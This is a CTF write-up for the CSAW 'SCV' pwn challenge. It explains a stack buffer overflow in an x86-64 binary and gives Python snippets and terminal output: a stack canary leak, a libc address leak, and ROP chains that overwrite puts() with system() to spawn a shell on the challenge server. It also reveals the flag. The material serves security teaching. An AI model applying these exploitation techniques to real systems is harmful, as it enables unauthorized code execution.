# SCV
## Pwn 100

#### shareef12

    SCV is too hungry to mine the minerals. Can you give him some food?

    nc pwn.chal.csaw.io 3764

This was fairly low point value pwnable. I expected it to be fairly straight
forward, but there were a few minor things that slowed down exploitation.
Stripped x86-64 binary presented a simple menu with three options.

    user@reversing:~/csaw/scv$ file scv
    scv: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
    linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
    BuildID[sha1]=8585d22b995d2e1ab76bd520f7826370df71e0b6, stripped
    user@reversing:~/csaw/scv$ ./scv
    -------------------------
    [*]SCV GOOD TO GO,SIR....
    -------------------------
    1.FEED SCV....
    2.REVIEW THE FOOD....
    3.MINE MINERALS....
    -------------------------
    >>

The first option would read data into a buffer, the second would print the same
buffer back to you, and the third would simply return. Due to the simple
interface, seems like a pretty straight forward buffer overflow. Passing in a
large cyclic buffer seemed to cause it to flood my terminal with invalid input
messages. From here I started reversing statically.

Input from the user is obtained with a call to read() from stdin, with a size of
0xf8 bytes. Fortunately for us, the destination buffer starts at `$rbp-0xb0`. If
we write a buffer of at least 0xb8 bytes, we should be able to control RIP with
space for 0x40 bytes of ROP chain. Let's try it.

    user@reversing:~/csaw/scv$ python -c "print 'a'*0xb8 + 'bbbbcccc'"
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccc
    user@reversing:~/csaw/scv$ ./scv
    -------------------------
    [*]SCV GOOD TO GO,SIR....
    -------------------------
    1.FEED SCV....
    2.REVIEW THE FOOD....
    3.MINE MINERALS....
    -------------------------
    >>1
    -------------------------
    [*]SCV IS ALWAYS HUNGRY.....
    -------------------------
    [*]GIVE HIM SOME FOOD.......
    -------------------------
    >>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccc
    -------------------------
    [*]SCV GOOD TO GO,SIR....
    -------------------------
    1.FEED SCV....
    2.REVIEW THE FOOD....
    3.MINE MINERALS....
    -------------------------
    >>3
    [*]BYE ~ TIME TO MINE MIENRALS...
    *** stack smashing detected ***: ./scv terminated
    Aborted (core dumped)

Oh no. Looks like there's a stack canary.

	user@reversing:~/csaw/scv$ checksec scv
	[*] '/home/user/csaw/scv/scv'
		Arch:     amd64-64-little
		RELRO:    Partial RELRO
		Stack:    Canary found
		NX:       NX enabled
		PIE:      No PIE (0x400000)

Since we can print our buffer, it shouldn't be hard to leak the canary value
though. All we have to do is provide enough input so that there are no null
bytes between the end of our buffer and the start of the canary. The canary is
at `$ebp-0x8` so if supply 0xa8 bytes, we should be able leak the canary value.

My initial attempt only printed the buffer. Examining the buffer in gdb showed
that the canary always started with a NULL byte. Writing an extra character
(0xa9 bytes total) allows us to leak the canary every time.

	user@reversing:~/csaw/scv$ python -c "print 'a'*0xa9"
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
	user@reversing:~/csaw/scv$ ./scv
	-------------------------
	[*]SCV GOOD TO GO,SIR....
	-------------------------
	1.FEED SCV....
	2.REVIEW THE FOOD....
	3.MINE MINERALS....
	-------------------------
	>>1
	-------------------------
	[*]SCV IS ALWAYS HUNGRY.....
	-------------------------
	[*]GIVE HIM SOME FOOD.......
	-------------------------
	>>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
	-------------------------
	[*]SCV GOOD TO GO,SIR....
	-------------------------
	1.FEED SCV....
	2.REVIEW THE FOOD....
	3.MINE MINERALS....
	-------------------------
	>>2
	-------------------------
	[*]REVIEW THE FOOD...........
	-------------------------
	[*]PLEASE TREAT HIM WELL.....
	-------------------------
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
	��~�2�@@

Now that we can leak the canary, I wrote some code to parse it out and use it in
our overflow buffer so we pass the canary check.

```python
# Fill buffer with non-zero up until stack cookie
conn.recvuntil(">>")
feed_scv("a" * 0xa9)   # plus one (first char of the stack cookie is 0)

# Leak the stack cookie
log.info("Leaking stack cookie")
data = review_food()
cookie = "\x00" + data[0xa9:0xb0]
log.info("Stack cookie: " + cookie.encode("hex"))
```

Since this challenge involves remote exploitation, we can assume ASLR is on, so
we'll need some form of ROP to get code execution. Unfortunately, we only have
64 bytes to do this with (only 8 gadgets). Additionally, since this is x64
arguments are passed in registers making ROP a little harder. My initial plan
was to use read() to read in a second larger ROP chain into the data section and
pivot to it. This would allow us to use a ROP chain of arbitrary length and get
around the 64-byte restriction. However when the function returns, rdx was 0, and
I couldn't find a pop rdx gadget in the binary.

Instead of pursuing this further, I decided to try and leak the address to libc
so I could use that for gadgets instead. We can use puts() to read an address
from the GOT and use the provided copy of libc to calculate libc base. From
there, if we simply return back to the start of main(), we can restart the
program and exploit it again.

```python
# Build the stage0 payload
# Leak the addr of puts() from the GOT, then restart for stage 1
stage0 =  p64(SCV_POP_RDI_GADGET)
stage0 += p64(scv.got["puts"])
stage0 += p64(scv.plt["puts"])
stage0 += p64(SCV_MAIN) # Jump back to main
```

After leaking libc base, we calculate the address of system() and a `pop rdx`
gadget within libc. We then rop to `read(stdin, scv.got["puts"], 8)` to
overwrite puts() with the next 8 bytes from stdin. Follow this ROP chain with
yet another return to main(). We send the address of system after triggering the
chain to overwrite puts().

```
# Build the stage1 payload
# Overwrite puts() with system(), then restart for stage 2
stage1 =  p64(SCV_POP_RDI_GADGET)
stage1 += p64(0)        # stdin
stage1 += p64(pop_rsi)
stage1 += p64(scv.got["puts"])
stage1 += p64(pop_rdx)
stage1 += p64(8)
stage1 += p64(scv.plt["read"])
stage1 += p64(SCV_MAIN) # Jump back to main
```

Now that puts() is really system(), we can simply send `/bin/sh\x00` as our
buffer and view it to trigger a shell.

	user@reversing:~/csaw/scv$ ./solve.py
	[*] '/home/user/csaw/scv/scv'
		Arch:     amd64-64-little
		RELRO:    Partial RELRO
		Stack:    Canary found
		NX:       NX enabled
		PIE:      No PIE (0x400000)
	[*] '/home/user/csaw/scv/libc-2.23.so'
		Arch:     amd64-64-little
		RELRO:    Partial RELRO
		Stack:    Canary found
		NX:       NX enabled
		PIE:      PIE enabled
	[+] Opening connection to pwn.chal.csaw.io on port 3764: Done
	[*] Leaking stack cookie
	[*] Stack cookie: 0014175537504b80
	[*] Sending stage 0 (0xd8 bytes)
	[*] Found libc base: 0x7f76a648c000
	[*] Found libc system(): 0x7f76a64d1390
	[*] Found libc "pop rsi" gadget: 0x7f76a64ac2e8
	[*] Found libc "pop rdx" gadget: 0x7f76a648db92
	[*] Sending stage 1 (0xf8 bytes)
	[*] Overwrote puts() with system()
	[*] Sending /bin/sh
	[*] Switching to interactive mode
	$ ls
	flag
	scv
	$ cat flag
	flag{sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11}
	$
	[*] Interrupted
	[*] Closed connection to pwn.chal.csaw.io port 3764
